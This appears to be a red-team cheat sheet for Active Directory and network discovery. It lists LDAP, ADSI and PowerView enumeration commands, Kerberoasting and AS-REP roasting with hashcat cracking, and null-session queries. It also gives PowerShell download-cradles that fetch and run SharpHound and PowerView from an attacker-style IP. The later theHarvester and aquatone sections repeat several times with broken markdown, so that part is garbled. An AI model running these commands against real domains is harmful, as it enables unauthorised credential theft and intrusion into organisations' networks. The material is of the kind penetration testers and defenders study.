---
description: >-
  The adversary is trying to figure out your environment.
  https://attack.mitre.org/tactics/TA0007/
---

# Discovery

## User Group Membership

{% code overflow="wrap" %}
```powershell
Get-ADPrincipalGroupMembership "USERNAME" | Select name
```
{% endcode %}

## MachineAccountQuote Lookup

{% code overflow="wrap" %}
```powershell
$domain = "burmat.local"
$domainDN = (Get-ADDomain -Identity $domain).DistinguishedName
$addMachineQuota = (Get-ADObject -Identity $domainDN -Properties ms-DS-MachineAccountQuota).'ms-DS-MachineAccountQuota'
Write-Host "Current AddMachineQuota value: $addMachineQuota"
```
{% endcode %}

## AD Enumeration via ADSI `DirectorySearcher`

Use the following to leverage ADSI and PowerShell for LDAP Queries

{% code overflow="wrap" %}
```
$users = ([adsisearcher]"<LDAP QUERY HERE>").FindAll();
```
{% endcode %}

### **Computer/User Objects**

{% code overflow="wrap" %}
```powershell
([adsisearcher]'(&(objectCategory=Computer))').FindAll();
([adsisearcher]'(&(objectCategory=User))').FindAll();
```
{% endcode %}

### **SPNs**

{% code overflow="wrap" %}
```powershell
([adsisearcher]"(&(&(servicePrincipalName=*) (UserAccountControl:1.2.840.113556.1.4.803:=512)) (!(UserAccountControl:1.2.840.113556.1.4.803:=2)))").FindAll();
```
{% endcode %}

Or

{% code overflow="wrap" %}
```powershell
$s = New-Object DirectoryServices.DirectorySearcher([ADSI]"");
$s.PageSize = 2000; 
$s.Filter = "(servicePrincipalName=*)";
$s.FindAll();
```
{% endcode %}

### Unconstrained delegation

{% code overflow="wrap" %}
```powershell
([adsisearcher]"(&(&(objectCategory=person)(objectClass=user)) (!userAccountControl:1.2.840.113556.1.4.803:=524288))").FindAll();
```
{% endcode %}

## Local Administrator Password Solution (LAPS)

Retrieve computers that are not configured with LAPS

{% code overflow="wrap" %}
```powershell
Get-ADComputer -Credential $cred -Server BURMAT.LOCAL -Filter {ms-Mcs-AdmPwd -notlike "*"} | Export-CSV -Path C:\temp\no_laps.csv;
```
{% endcode %}

## BloodHound

### Ingester Launch

{% code overflow="wrap" %}
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.123/ps/SharpHound.ps1');
Invoke-BloodHound -CollectionMethod All -CompressData -SkipPing;
```
{% endcode %}

## LDAP Enumeration

### Null Sessions

{% code overflow="wrap" %}
```sh
ldapsearch -x -h 10.10.10.123 -D '' -w '' -b "DC=BURMAT,DC=LOCAL"
```
{% endcode %}

### LDAP Queries

Below are some useful LDAP queries that will help you enumerate a system. Some of them require a valid username/password to get more information. My go-to for these queries is `ldapsearch`. Use the following command and fill in your LDAP query in the placeholder:

{% code overflow="wrap" %}
```bash
ldapsearch -LLL -x -H ldap://burmat.local -D "svc-burmat" -w "burmat123$" -b "dc=burmat,dc=LOCAL" "<LDAP QUERY HERE>"
```
{% endcode %}

#### Domain Usernames

Get usernames into a list by enumerating user objects:

{% code overflow="wrap" %}
```bash
ldapsearch -x -h burmat.local -b "dc=burmat,dc=local" -s sub "(objectclass=user)" | grep sAMAccountName | cut -d " " -f 2 > users.txt
```
{% endcode %}

#### ASREPRoast

{% code overflow="wrap" %}
```powershell
## ldap filter to find accounts susceptible to this:
"(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"

## generate a list of user accounts and use impacket to exploit:

## and if you get a ticket, you can crack it:
hashcat -m 18200 -a 0 --force user.hash /usr/share/wordlists/rockyou.txt
```
{% endcode %}

#### Users with SPNs

{% code overflow="wrap" %}
```powershell
"(&(&(servicePrincipalName=*) (UserAccountControl:1.2.840.113556.1.4.803:=512)) (!(UserAccountControl:1.2.840.113556.1.4.803:=2)))"
```
{% endcode %}

If you get valid domain credentials, you can dump them w/ impacket for offline cracking:

{% code overflow="wrap" %}
```sh
GetUserSPNs.py -request burmat.local/svc-burmat:burmat123
```
{% endcode %}

#### User / Computers with Unconstrained Delegation

{% code overflow="wrap" %}
```powershell
# user:
"(&(&(objectCategory=person) (objectClass=user)) (userAccountControl:1.2.840.113556.1.4.803:=524288))"

# computer:
"(&(objectCategory=computer) (objectClass=computer) (userAccountControl:1.2.840.113556.1.4.803:=524288))"
```
{% endcode %}

#### Domain Administrators

{% code overflow="wrap" %}
```powershell
"(&(objectClass=user) (memberof:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=burmat,DC=local))" "objectClass=groupPolicyContainer"
```
{% endcode %}

## PowerSploit

Use the `dev` branch or [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/dev). For an already incredible cheat sheet, [check out HarmJ0y's](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993).

{% code overflow="wrap" %}
```powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.10.123/ps/PowerView.ps1')
```
{% endcode %}

### Get Domain Users

{% code overflow="wrap" %}
```powershell
Get-DomainUser * -Domain burmat.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset, lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,mail,useraccountcontrol | Export-CSV users.csv
```
{% endcode %}

### Retrieve Group Members

{% code overflow="wrap" %}
```powershell
Get-DomainGroupMember -Identity "Domain Admins" | Select-Object membername
```
{% endcode %}

### Users Allowed to Delegate

{% code overflow="wrap" %}
```powershell
Get-DomainUser -Credential $cred -Server dc01.burmat.local -Domain burmat.local -AllowDelegation -AdminCount | Export-Csv -Path C:\allowed_to_deleg.csv
```
{% endcode %}

### User Description Gathering

{% code overflow="wrap" %}
```powershell
Get-DomainUser -Credential $cred -Server dc01.burmat.local -Domain burmat.local -Properties SAMAccountName,Description | Select-Object SAMAccountName,Description | Export-CSV -Path C:\user_descriptions.csv
```
{% endcode %}

### Enumerate User DACLs

{% code overflow="wrap" %}
```powershell
Get-DomainObjectAcl -Identity it_admin -ResolveGUIDs ? { $_.SecurityIdentifier -Match $(ConvertTo-SID burmat) }
```
{% endcode %}

### SPN Ticket Request (Kerberoasting)

{% code overflow="wrap" %}
```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | Export-Csv .\ticket.csv -NoTypeInformation
```
{% endcode %}

### Domain Controller Discovery

{% code overflow="wrap" %}
```powershell
Get-DomainComputer -Credential $cred -Server dc01.burmat.local -Domain burmat.local -SearchBase "LDAP://OU=Domain Controllers,DC=BURMAT,DC=LOCAL" | Export-Csv -Path C:\domain_controllers.csv
```
{% endcode %}

### Domain Computers

{% code overflow="wrap" %}
```powershell
Get-DomainComputer -Filter * -Server dc01.burmat.local | export-csv -Path C:\temp\domain_computers.csv
```
{% endcode %}

### Unconstrained Delegation (Other than DCs)

{% code overflow="wrap" %}
```powershell
Get-DomainComputer -Credential $cred -Server dc01.burmat.local -Domain burmat.local -Unconstrained | Export-Csv -Path C:\unconstrained_deleg_machines.csv
```
{% endcode %}

### Network Shares Enumeration

{% code overflow="wrap" %}
```powershell
Find-DomainShare -ComputerName fs01.domain.local -ComputerDomain domain.local -CheckShareAccess
```
{% endcode %}

Authenticated with custom credentials:

{% code overflow="wrap" %}
```powershell
$secpassword = ConvertTo-SecureString 'Password123$' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $secpassword)
Find-DomainShare -Domain dir.svc.accenture.com -Credential $cred
```
{% endcode %}

Looping a list of hostnames:

{% code overflow="wrap" %}
```powershell
foreach ($h in $smb_hosts) {  Find-DomainShare -Credential $cred -computername "$h" -computerdomain burmat.local -server dc1.burmat.local -CheckShareAccess; }
```
{% endcode %}

## theHarvester

An open-source intelligence (OSINT) gathering tool, that will tap into many difference APIs to gather data for you. GitHub: [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) Installation is a PITA. Put your API keys into the api-keys.yaml file in the root of the directory

<details>

<summary>Sample theHarvers API Configuration File</summary>

This goes in \`\~/.theHarvester/api-keys.yaml\` for Kali \`\`\` apikeys: bevigil: key:

binaryedge: key:

bing: key:

bufferoverun: key:

censys: id: secret:

criminalip: key:

fullhunt: key:

github: key:

hunter: key:

hunterhow: key:

intelx: key:

netlas: key:

onyphe: key:

pentestTools: key:

projectDiscovery: key:

rocketreach: key:

securityTrails: key:

shodan: key:

tomba: key: secret:

virustotal: key:

zoomeye: key:

````
</details>
## Web Enumeration
### aquatone
Found here: [GitHub - michenriksen/aquatone: A Tool for Domain Flyovers](https://github.com/michenriksen/aquatone)
#### Basic Usage
```bash
cat hosts.txt | aquatone -ports small -out scans/aquatone -threads 10 -screenshot-timeout 50000 -chrome-path /usr/bin/chromium
````

**Nmap Scan Results**

```bash
cat nmap/tcp_web.xml | aquatone -nmap -screenshot-timeout 50000 -out scans/aquatone -threads 10 -chrome-path /usr/bin/chromium
```

**Using a Proxy via Burp**

(Assuming Burp is listening to localhost:8080):

* `-proxy http://127.0.0.1:8080`

\## Network Discovery ### ARP \`\`\` arp -a -N \[interface] \`\`\`

</details>

### **Email Address Gathering:**

Getting a list of email addresses from i[ntelx.io:](http://intelx.io/)

{% code overflow="wrap" %}
```sh
theHarvester.py -d contoso.com -b intelx >> intelx-contoso.com.txt
```
{% endcode %}

If you are doing multiple domains, you can use the following bash one-liner, where `domains.txt` is a list of domain names to search:

{% code overflow="wrap" %}
```bash
while read d; do python3 theHarvester.py -b intelx -d $d -f "th-$d"; sleep 1; done < domains.txt
```
{% endcode %}

Clean up the output to just be emails with the following, if you have problems:

{% code overflow="wrap" %}
```sh
grep -i -o '[A-Z0-9._%+-]\\+@[A-Z0-9.-]\\+\\.[A-Z]\\{2,4\\}' intelx-contoso.com.txt
```
{% endcode %}

## Web Enumeration

### aquatone

Found here: [GitHub - michenriksen/aquatone: A Tool for Domain Flyovers](https://github.com/michenriksen/aquatone)

Basic Usage

{% code overflow="wrap" %}
```bash
cat hosts.txt | aquatone -ports small -out scans/aquatone -threads 10 -screenshot-timeout 50000 -chrome-path /usr/bin/chromium
```
{% endcode %}

Nmap Scan Results

{% code overflow="wrap" %}
```bash
cat nmap/tcp_web.xml | aquatone -nmap -screenshot-timeout 50000 -out scans/aquatone -threads 10 -chrome-path /usr/bin/chromium
```
{% endcode %}

Using a Proxy via Burp

(Assuming Burp is listening to localhost:8080):

* `-proxy http://127.0.0.1:8080`

<details>

<summary>Built-In Port Lists &#x26; Aliases</summary>

\* \`small: 80, 443\` \* \`medium: 80, 443, 8000, 8080, 8443 (same as default)\` \* \`large: 80, 81, 443, 591, 2082, 2087, 2095, 2096, 3000, 8000, 8001, 8008, 8080, 8083, 8443, 8834, 8888\` \* \`xlarge: 80, 81, 300, 443, 591, 593, 832, 981, 1010, 1311, 2082, 2087, 2095, 2096, 2480, 3000, 3128, 3333, 4243, 4567, 4711, 4712, 4993, 5000, 5104, 5108, 5800, 6543, 7000, 7396, 7474, 8000, 8001, 8008, 8014, 8042, 8069, 8080, 8081, 8088, 8090, 8091, 8118, 8123, 8172, 8222, 8243, 8280, 8281, 8333, 8443, 8500, 8834, 8880, 8888, 8983, 9000, 9043, 9060, 9080, 9090, 9091, 9200, 9443, 9800, 9981, 12443, 16080, 18091, 18092, 20720, 28017\`&#x20;

</details>

\## Network Discovery ### ARP \`\`\` arp -a -N \[interface] \`\`\`













<details>

<summary>Sample theHarvers API Configuration File</summary>

This goes in \`\~/.theHarvester/api-keys.yaml\` for Kali \`\`\` apikeys: bevigil: key:

binaryedge: key:

bing: key:

bufferoverun: key:

censys: id: secret:

criminalip: key:

fullhunt: key:

github: key:

hunter: key:

hunterhow: key:

intelx: key:

netlas: key:

onyphe: key:

pentestTools: key:

projectDiscovery: key:

rocketreach: key:

securityTrails: key:

shodan: key:

tomba: key: secret:

virustotal: key:

zoomeye: key:

````
</details>
## Web Enumeration
### aquatone
Found here: [GitHub - michenriksen/aquatone: A Tool for Domain Flyovers](https://github.com/michenriksen/aquatone)
#### Basic Usage
```bash
cat hosts.txt | aquatone -ports small -out scans/aquatone -threads 10 -screenshot-timeout 50000 -chrome-path /usr/bin/chromium
````

**Nmap Scan Results**

```bash
cat nmap/tcp_web.xml | aquatone -nmap -screenshot-timeout 50000 -out scans/aquatone -threads 10 -chrome-path /usr/bin/chromium
```

**Using a Proxy via Burp**

(Assuming Burp is listening to localhost:8080):

* `-proxy http://127.0.0.1:8080`

\## Network Discovery ### ARP \`\`\` arp -a -N \[interface] \`\`\`

</details>
